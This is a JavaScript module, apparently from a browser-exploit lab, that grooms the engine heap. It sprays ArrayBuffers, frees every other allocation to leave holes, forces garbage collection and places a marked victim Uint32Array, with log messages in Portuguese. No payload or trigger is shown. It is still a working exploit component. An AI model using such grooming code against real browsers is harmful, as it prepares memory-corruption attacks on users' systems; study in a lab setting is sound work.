// js/heap_groomer.mjs
import { log, PAUSE_LAB } from './utils.mjs';

export let victim_object = null;
export let victim_object_type = 'TypedArray';
let spray_array_temp = []; // Interno ao módulo

export async function groomHeapForSameSize(spray_count, object_size, intermediate_alloc_count, victim_first = true) {
    const FNAME_GROOM = "HeapGroomer.groomHeap";
    log(`Iniciando heap grooming (obj_size=${object_size}, spray_count=${spray_count}, inter=${intermediate_alloc_count}, victim_first=${victim_first})`, "tool", FNAME_GROOM);
    spray_array_temp = []; // Reset
    const fill_size = object_size * 2 > 0 ? object_size * 2 : object_size + 16;
    log(`   Fase 1: Spray com ${fill_size} bytes. Contagem: ${Math.floor(spray_count / 2)}`, "info", FNAME_GROOM);
    for (let i = 0; i < Math.floor(spray_count / 2); i++) { spray_array_temp.push(new ArrayBuffer(fill_size)); }
    log(`   Fase 2: Criando ${intermediate_alloc_count} buracos de ${object_size} bytes.`, "info", FNAME_GROOM);
    let holes = [];
    for (let i = 0; i < intermediate_alloc_count; i++) { holes.push(new ArrayBuffer(object_size)); }
    for (let i = 0; i < intermediate_alloc_count; i = i + 2) { holes[i] = null; }
    log(`   Fase 3: Spray final com ${object_size} bytes. Contagem: ${spray_count}`, "info", FNAME_GROOM);
    for (let i = 0; i < spray_count; i++) { spray_array_temp.push(new ArrayBuffer(object_size)); }
    if (typeof globalThis.gc === 'function') {
        log("Tentando forçar GC (x3)...", "tool", FNAME_GROOM);
        try { globalThis.gc(); await PAUSE_LAB(50); globalThis.gc(); await PAUSE_LAB(50); globalThis.gc();}
        catch(e){ log("Falha ao forçar GC: " + e.message, "warn", FNAME_GROOM);}
    }
    log("Heap grooming (tentativa) concluído.", "warn", FNAME_GROOM);
}

export async function prepareVictim(object_size) {
    const FNAME_PREP_VICTIM = "HeapGroomer.prepareVictim";
    victim_object = null; // Reset
    victim_object_type = 'TypedArray';
    const victim_typed_array_elements = object_size / 4;
    if (object_size % 4 !== 0) {
        log("ERRO CRÍTICO: Tamanho alvo não é múltiplo de 4 para Uint32Array.", "error", FNAME_PREP_VICTIM); return false;
    }
    victim_object = new Uint32Array(victim_typed_array_elements);
    for(let i=0; i < victim_object.length; i++) { victim_object[i] = (0xBB000000 | i) ; }
    log(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
    return true;
}
